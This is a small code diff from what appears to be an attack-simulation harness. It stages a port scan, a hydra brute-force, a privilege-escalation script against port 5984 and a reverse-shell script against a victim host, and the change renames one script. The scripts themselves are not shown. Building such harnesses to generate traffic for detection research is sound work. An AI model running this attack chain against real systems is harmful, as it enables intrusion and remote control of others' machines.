@@ -46,7 +46,7 @@ portscan = ExecCommand("sh /app/nmap.sh ${victim}", name="port-scan")
 bruteforce = ExecCommand("sh /app/hydra.sh ${victim}", name="brute-force",
                          after_packet=TCPPacketPartsMatcher(["GET /", "User-Agent: curl"],
                                                             forbidden_parts=["Authorization"]))
-privilege_escalation = ExecCommand("python3 /app/exploit.py ${victim}:5984", name="privilege-escalation",
+privilege_escalation = ExecCommand("python3 /app/attacker.py ${victim}:5984", name="privilege-escalation",
                                    after_packet=TCPPacketPartsMatcher(["GET /_all_dbs", "User-Agent: curl",
                                                                        "Authorization"]))
 remote_code = ExecCommand("python3 /app/reverse-shell.py ${victim}:5984", name="remote-code",
